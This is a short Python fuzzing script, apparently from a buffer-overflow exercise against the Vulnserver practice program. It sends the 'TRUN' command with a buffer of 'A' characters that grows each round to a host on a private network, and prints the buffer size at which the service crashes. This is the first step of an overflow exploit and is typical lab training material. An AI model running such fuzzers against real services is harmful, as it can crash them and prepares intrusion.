
#!/usr/bin/python

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.101', 9999))

        s.send(('TRUN /.:/' + buffer).encode())
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print("The prog crashed at %s bytes" % str(len(buffer)))
        sys.exit()

